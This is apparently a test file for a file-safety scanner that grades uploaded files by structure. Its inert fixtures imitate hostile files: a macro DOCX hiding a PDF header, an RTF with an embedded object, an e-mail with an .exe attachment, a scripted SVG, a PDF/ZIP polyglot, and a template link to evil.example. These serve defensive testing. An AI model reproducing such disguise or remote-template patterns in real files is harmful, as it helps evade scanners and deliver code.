/* file-safety R56, R6, R14, R51 (fix round 9, G130c, G130d, G136d, G127d; K4831 (6); SCAN A16, D13, F1-F8; DOCS O9, O11, S3): the kind and the
   grade come from the file's structure, whatever its size. At the module's interface, over provenance's real tables and a store that
   serves range reads as R2 does, counting every load of a whole. */
import { test } from "node:test";
import assert from "node:assert/strict";
import { filedWorld as world, pdf, sha, enc } from "./fixture.mjs";
import { makeZip } from "../../make-zip.mjs";
import { docxOf, DOCM_MAIN, PNG, jpeg, TIFF, HEIC, BMP } from "./r9-kit.mjs";
import { GRADE_READ_MAX } from "../../../src/file-safety/index.mjs";

const MIB = 1024 * 1024;
const V = { viewer: "member:m1" };
const codes = (g) => g.reasons.map((r) => r.code).sort();
const grade = async (w, bytes, opts) => { const s = await w.capture(bytes, opts); return w.fs.threatOf({ captureSha: s }); };

test("R56: a PDF header in the first KiB of a macro-enabled office package does not make it a PDF: its kind is the package's and its macros are seen; a JPEG, a PNG or an HTML page quoting a PDF or HTML header is what its structure says", async () => {
  const w = world();
  const docm = makeZip([{ name: "[Content_Types].xml", data: `<!-- %PDF-1.7 --><?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="${DOCM_MAIN}"/></Types>`, method: 0 },
    { name: "word/document.xml", data: "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p><w:r><w:t>hi</w:t></w:r></w:p></w:body></w:document>" },
    { name: "word/vbaProject.bin", data: "not a cfb" }]);
  assert.ok(new TextDecoder("latin1").decode(docm.subarray(0, 1024)).includes("%PDF-1.7"), "premise: the header is in the first KiB");
  const g = await grade(w, docm);
  assert.equal(g.format, "docx", "the kind is the package's, never a PDF");
  assert.deepEqual(codes(g), ["active:vba-project"], "its macros are seen");
  /* SCAN A12: a picture whose comment or text chunk holds a PDF or HTML header is a picture */
  const j = await grade(w, jpeg("%PDF-1.4 <html>"));
  assert.deepEqual([j.format, j.threat], ["image", "low"]);
  const html = await grade(w, enc(`<!doctype html><html><body><svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg></body></html>`));
  assert.deepEqual([html.format, html.threat], ["html", "low"], "HTML with an inline svg is HTML");
  const svg = await grade(w, enc(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script/></svg>`));
  assert.deepEqual([svg.format, svg.threat], ["svg", "high"]);
});

test("R56: an RTF with an embedded object and an e-mail with an attachment are high, not low as plain text; a plain RTF and a plain e-mail are low; UTF-16 and Latin-1 text are text", async () => {
  const w = world();
  const rtfObj = await grade(w, enc("{\\rtf1\\ansi hello {\\object\\objemb{\\*\\objdata 0105000002000000}}}"));
  assert.deepEqual([rtfObj.format, rtfObj.threat, codes(rtfObj)], ["rtf", "high", ["active:ole-object"]]);
  const rtfPlain = await grade(w, enc("{\\rtf1\\ansi plain words}"));
  assert.deepEqual([rtfPlain.format, rtfPlain.threat], ["rtf", "low"]);
  const eml = (extra) => enc(["From: a@example.org", "To: b@example.org", "Subject: hi", "Date: Mon, 5 Oct 2026 10:00:00 +0000", "Message-ID: <1@example.org>", "MIME-Version: 1.0",
    'Content-Type: multipart/mixed; boundary="B"', "", "--B", "Content-Type: text/plain", "", "words", ...extra, "--B--", ""].join("\r\n"));
  const withExe = await grade(w, eml(["--B", 'Content-Type: application/octet-stream; name="run.exe"', 'Content-Disposition: attachment; filename="run.exe"', "Content-Transfer-Encoding: base64", "", "TVqQAAMAAAAEAAAA"]));
  assert.deepEqual([withExe.format, withExe.threat, codes(withExe)], ["eml", "high", ["active:embedded-file"]]);
  const plain = await grade(w, eml([]));
  assert.deepEqual([plain.format, plain.threat], ["eml", "low"]);
  /* UTF-16 (a byte order mark, and without one) and Latin-1 */
  const u16 = new Uint8Array([0xff, 0xfe, ...[..."hello there\n"].flatMap((c) => [c.charCodeAt(0), 0])]);
  const u16be = new Uint8Array([...[..."hello there, a second line\n"].flatMap((c) => [0, c.charCodeAt(0)])]);
  const lat = new Uint8Array([...enc("caf"), 0xe9, ...enc(" au lait\n")]);
  for (const [name, bytes] of [["utf-16 with a mark", u16], ["utf-16 without", u16be], ["latin-1", lat]]) {
    const g = await grade(w, bytes);
    assert.deepEqual([g.format, g.threat], ["text", "low"], name);
  }
  /* control: bytes that are no text are unknown, and high */
  const bin = await grade(w, new Uint8Array([0, 1, 2, 3, 250, 251, 252, 0, 7, 8]));
  assert.deepEqual([bin.format, bin.threat], ["unknown", "high"]);
});

test("R56 R6: an image is graded by its source and not its size: JPEGs of 1 MiB + 1, 3 MB and 25 MB that this copy fetched are low; a TIFF, a HEIC and a BMP are stated as unread image types, low by source, and the structure check of any image is not_examined, never clean", async () => {
  const w = world({ scan: { clamav: () => ({ result: "clean" }) } });
  for (const n of [MIB + 1, 3_000_000, 25_000_000]) {
    const g = await grade(w, jpeg("c", n));
    assert.deepEqual([g.format, g.threat, codes(g)], ["image", "low", []], `${n} B`);
  }
  for (const [name, bytes] of [["tiff", TIFF], ["heic", HEIC], ["bmp", BMP]]) {
    const g = await grade(w, bytes);
    assert.deepEqual([g.format, g.threat, g.image], ["image", "low", { type: name, read: false }], name);
  }
  const png = await grade(w, PNG);
  assert.deepEqual(png.image, { type: "png", read: true });
  /* not handed in by this copy: high by source, as for any file */
  const knock = await grade(w, jpeg("k", MIB + 5), { via: "doorbell", address: "knock:K-1" });
  assert.deepEqual(codes(knock), ["source_not_fetched"]);
  /* the deeper check's structure check */
  await w.tool("scanii");
  const t = await w.capture(TIFF.slice(0, 11).map((x, i) => (i === 10 ? 9 : x)));
  const j = await w.capture(PNG);
  for (const s of [t, j]) w.fs.requestDeeperCheck({ captureSha: s, ...V });
  const d = await w.fs.deeperBatch({});
  assert.equal(d.done.length, 2);
  const structure = (s) => w.fs.verdictNotes({ captureSha: s }).notes.find((n) => n.kind === "deeper").checks.find((c) => c.check === "structure");
  assert.deepEqual([structure(t).result, structure(t).detail], ["not_examined", "UNREAD_IMAGE_TYPE:tiff"]);
  assert.deepEqual([structure(j).result, structure(j).detail], ["not_examined", "IMAGE"]);
  for (const x of d.done) assert.equal(x.result, "clean", "an unexamined image does not leave the check incomplete for ever, and the outside engine's clean stands");
});

test("R56 R6: a PDF with a ZIP end joined to it is a polyglot, high; a PDF header and trailer is a PDF", async () => {
  const w = world();
  const z = makeZip([{ name: "a.txt", data: "a" }]);
  const poly = await grade(w, new Uint8Array([...pdf(false, "poly"), ...z]));
  assert.equal(poly.format, "polyglot");
  assert.equal(poly.threat, "high");
  assert.deepEqual([(await grade(w, pdf(false, "plain"))).format, (await grade(w, pdf(false, "plain2"))).threat], ["pdf", "low"]);
});

/* A DOCX of the size named, its bulk a stored member of zeros, so its directory is at the end and its parts small. */
const bigDocx = (bytes, extra = []) => docxOf([{ name: "word/media/pad.bin", data: new Uint8Array(bytes), method: 0 }, ...extra]);

test("R56 R51 G130c: a DOCX of GRADE_READ_MAX + 1 and one 4 MiB over it are graded from the directory, read by range and never loaded, are low when fetched and have no active content, and are rendered; macros and external targets in the directory are seen", async () => {
  const w = world();
  const loads = [];
  const get = w.bucket.get.bind(w.bucket);
  w.bucket.get = async (k, opts) => {
    const o = await get(k, opts);
    if (!o) return o;
    return { ...o, arrayBuffer: async () => { if (!(opts && opts.range) || opts.range.length >= o.size) loads.push(k); return o.arrayBuffer(); } };
  };
  for (const n of [GRADE_READ_MAX + 1, GRADE_READ_MAX + 4 * MIB + 1]) {
    const bytes = bigDocx(n);
    assert.ok(bytes.length > GRADE_READ_MAX);
    const s = await w.capture(bytes);
    const g = await w.fs.threatOf({ captureSha: s, ...V });
    assert.deepEqual([g.format, g.threat, codes(g)], ["docx", "low", []], `${n}`);
    assert.deepEqual(loads, [], "the whole was never loaded");
    const st = await w.fs.originalState({ captureSha: s, ...V });
    assert.deepEqual([st.may_open, st.path], [true, "plain"]);
    assert.equal((await w.fs.safeView({ captureSha: s, ...V })).code, "SAFE_VIEW_PENDING", "it is queued to render, not refused for its size");
    await w.fs.renderBatch({});
    assert.equal(w.calls("/render").at(-1).body.target.capture_sha, s);
    assert.equal(w.calls("/render").at(-1).body.route, "office");
  }
  /* the directory shows a macro project and a relationship to a target outside the file */
  const macro = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/vbaProject.bin", data: "x" }]));
  assert.deepEqual(codes(await w.fs.threatOf({ captureSha: macro })), ["active:vba-project"]);
  const rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>';
  const ext = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/_rels/document.xml.rels", data: rels }]));
  assert.deepEqual(codes(await w.fs.threatOf({ captureSha: ext })), ["active:external-target"]);
  const link = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/></Relationships>';
  const hyp = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/_rels/document.xml.rels", data: link }]));
  assert.deepEqual(codes(await w.fs.threatOf({ captureSha: hyp })), [], "a hyperlink acts on a click, not on opening");
  /* an encrypted member shows in the directory too */
  const encm = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/media/locked.bin", data: "x", encrypted: "traditional" }]));
  assert.ok(codes(await w.fs.threatOf({ captureSha: encm })).includes("encrypted"));
  /* control: a big PDF is still graded unread (its objects are not in a directory) */
  const bp = new Uint8Array(GRADE_READ_MAX + MIB).fill(66); bp.set(pdf(false, "bigp"), 0);
  const gp = await grade(w, bp);
  assert.deepEqual([gp.format, codes(gp).includes("unread")], ["pdf", true]);
  assert.equal(sha("a").length, 64);
});

test("R56 G127d: a DOCX held in parts with no whole is graded from range reads across the part seam by its whole digest, never by a part's", async () => {
  const w = world();
  const whole = bigDocx(GRADE_READ_MAX + 4 * MIB + 1);
  const PART = 8 * MIB;
  const parts = [];
  for (let o = 0, i = 0; o < whole.length; o += PART, i++) {
    const c = whole.subarray(o, o + PART);
    parts.push({ sha256: sha(c), bytes: c.length, chunk: c });
  }
  const ws = sha(whole);
  w.exec(`INSERT OR IGNORE INTO bundles (bundle_id, object_type, group_id, title, current_state, created, last_updated, bundle_sha, row_version) VALUES ('INFO-P', 'information', 'g', 't', 'collected', '2026-01-01', '2026-01-01', 'x', 1)`);
  w.exec(`INSERT INTO register (capture_sha, bundle_id, path, encoding, bytes, registered, authored, whole) VALUES (?, 'INFO-P', 'snapshots/doc.docx', 'binary', ?, '2026-01-01T00:00:00Z', 0, 1)`, ws, whole.length);
  parts.forEach((p, i) => w.exec(`INSERT INTO register_parts (bundle_id, whole_sha, idx, part_sha, bytes, path) VALUES ('INFO-P', ?, ?, ?, ?, ?)`, ws, i, p.sha256, p.bytes, `snapshots/doc.part${i + 1}`));
  for (const p of parts) await w.bucket.put(`bio/captures/${p.sha256}`, p.chunk);
  w.prov.recordReceipt({ address: "https://files.example/big.docx", addressNorm: "https://files.example/big.docx", captureSha: ws,
    retrieved: new Date(w.clock.now).toISOString().replace(/\.\d+Z$/, "Z"), via: "direct", retrievalLocator: "https://files.example/big.docx" });
  w.project("PROJ-1", "m1");
  const g = await w.fs.threatOf({ captureSha: ws });
  assert.deepEqual([g.format, g.threat, codes(g)], ["docx", "low", []]);
  assert.equal((await w.fs.threatOf({ captureSha: parts[0].sha256 })).code, "FILE_NOT_HELD", "a part's digest names no file");
  await w.fs.renderBatch({});
  assert.deepEqual(w.calls("/render").at(-1).body.target.parts.map((p) => p.sha256), parts.map((p) => p.sha256), "the scanner is told the parts of the whole");
});

test("R6 R56 G136b (X19): threatOf of an archive holds one member's bytes at a time, not every member's until the call returns (the byte ledger's peak)", async () => {
  const { byteLedger } = await import("../../../src/byte-ledger.mjs");
  const ledger = byteLedger();
  const w = world({ ledger });
  const member = (i) => new Uint8Array([...pdf(false, `member ${i}`), ...enc(`\n%${"x".repeat(2 * MIB)}\n`)]);
  const entries = Array.from({ length: 6 }, (_, i) => ({ name: `m${i}.pdf`, data: member(i), method: 0 }));
  const zipped = makeZip(entries);
  const z = await w.capture(zipped);
  w.home(z, "INFO-Z");
  const u = await w.acq.unpack({ core: w.record, provenance: w.prov }, { archiveSha: z, by: "m1", member: true });
  assert.equal(u.ok, true, JSON.stringify(u).slice(0, 200));
  w.homeAll();
  const g = await w.fs.threatOf({ captureSha: z });
  assert.deepEqual(g.archive, { opened: true, entries: 6, members_low: 6, members_high: 0 });
  assert.equal(ledger.held(), 0, "everything the call held is let go when it returns");
  assert.ok(ledger.peak() >= zipped.length, "the archive itself is read once");
  assert.ok(ledger.peak() <= zipped.length + 2.5 * MIB, `peak ${ledger.peak()} is the archive and one member, not all six (${zipped.length + 6 * 2 * MIB})`);
});
